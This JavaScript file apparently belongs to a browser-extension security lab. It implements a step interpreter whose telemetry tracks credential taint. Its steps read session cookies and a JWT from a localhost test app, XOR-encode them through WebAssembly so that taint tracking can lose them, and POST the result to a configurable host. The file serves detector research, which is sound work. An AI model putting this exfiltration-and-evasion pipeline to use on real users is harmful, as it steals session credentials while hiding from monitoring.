// Step interpreter shared by content script and service worker.
// Each step performs a REAL browser action and emits a telemetry event describing it.
// Taint model: `vars[name] = {v: value, tags: [credential ids]}`; tags propagate through
// JS-level operations. Taint is NOT propagated through WebAssembly output with probability
// `cfg.wasm_taint_drop` (models a JS-level tracker that cannot see inside Wasm).
var WASM = null;
async function agWasm(comp) {
  if (!WASM) {
    const buf = await (await fetch(chrome.runtime.getURL('codec.wasm'))).arrayBuffer();
    WASM = (await WebAssembly.instantiate(buf)).instance;
    agEmit({ event_type: 'wasm_load', component: comp, module: 'codec.wasm' });
  }
  return WASM;
}
const agTags = (vars, names) => [...new Set((names || []).flatMap(n => (vars[n] ? vars[n].tags : [])))];
const agVals = (vars, names) => (names || []).map(n => (vars[n] ? vars[n].v : '')).join('|');

async function agStep(step, vars, comp, idx) {
  const mod = comp === 'content_script' ? 'content.js' : 'background.js';
  const base = { component: comp, module: mod, step_idx: idx };
  const ins = step.in || [];
  switch (step.op) {
    case 'dom_read': {
      const n = document.querySelectorAll('li, p, h1, input').length;
      agEmit({ ...base, event_type: 'dom_access', api: 'document.querySelectorAll' });
      vars[step.out] = { v: document.title + ':' + n, tags: [] };
      break;
    }
    case 'cookie_read': {
      agEmit({ ...base, event_type: 'api_call', api: 'chrome.cookies.get' });
      const c = await chrome.cookies.get({ url: 'http://localhost:5000/', name: step.cookie });
      const val = c ? c.value : 'MISSING';
      const id = await agHash(val);
      agEmit({ ...base, event_type: 'credential_access', api: 'chrome.cookies.get',
        cred_type: step.cookie === 'lab_session' ? 'session_cookie' : 'jwt_cookie', cred_id: id });
      vars[step.out] = { v: val, tags: ['cred:' + id] };
      break;
    }
    case 'jwt_read': {
      agEmit({ ...base, event_type: 'api_call', api: 'localStorage.getItem' });
      const val = localStorage.getItem('test_jwt') || 'MISSING';
      const id = await agHash(val);
      agEmit({ ...base, event_type: 'credential_access', api: 'localStorage.getItem',
        cred_type: 'jwt_localstorage', cred_id: id });
      vars[step.out] = { v: val, tags: ['cred:' + id] };
      break;
    }
    case 'storage_write': {
      const src = vars[ins[0]] || { v: '', tags: [] };
      agEmit({ ...base, event_type: 'api_call', api: 'chrome.storage.local.set' });
      await chrome.storage.local.set({ [step.key]: src });
      agEmit({ ...base, event_type: 'storage_write', object: step.key, in_tags: src.tags });
      break;
    }
    case 'storage_read': {
      agEmit({ ...base, event_type: 'api_call', api: 'chrome.storage.local.get' });
      const r = await chrome.storage.local.get(step.key);
      const got = r[step.key] || { v: '', tags: [] };
      agEmit({ ...base, event_type: 'storage_read', object: step.key, out_tags: got.tags });
      vars[step.out] = got;
      break;
    }
    case 'js_transform': {
      const f = MODS[step.module][step.fn];
      const tags = agTags(vars, ins);
      vars[step.out] = { v: f(agVals(vars, ins)), tags };
      agEmit({ ...base, event_type: 'script_exec', script: step.module, fn: step.fn, in_tags: tags, out_tags: tags });
      break;
    }
    case 'wasm_encode': {
      const w = await agWasm(comp);
      const inTags = agTags(vars, ins);
      const bytes = new TextEncoder().encode(agVals(vars, ins));
      const out = Array.from(bytes).map(b => w.exports.xor(b, 0x5a).toString(16).padStart(2, '0')).join('');
      const kept = Math.random() >= (self.AG_CFG.wasm_taint_drop || 0);
      const outTags = kept ? inTags : [];
      agEmit({ ...base, event_type: 'wasm_call', script: 'codec.wasm', fn: 'xor', in_tags: inTags, out_tags: outTags });
      vars[step.out] = { v: out, tags: outTags };
      break;
    }
    case 'send': {
      const url = 'http://' + step.dest + step.path + '?sid=' + AG.sid;
      const body = agVals(vars, ins);
      const tags = agTags(vars, ins);
      let ok = true;
      try { await fetch(url, { method: 'POST', mode: 'no-cors', body }); } catch (e) { ok = false; }
      agEmit({ ...base, event_type: 'http_request', api: 'fetch', destination: step.dest,
        dest_path: step.path, method: 'POST', payload_tags: tags, payload_len: body.length, ok });
      break;
    }
    case 'wait':
      await agSleep(step.ms);
      break;
  }
}
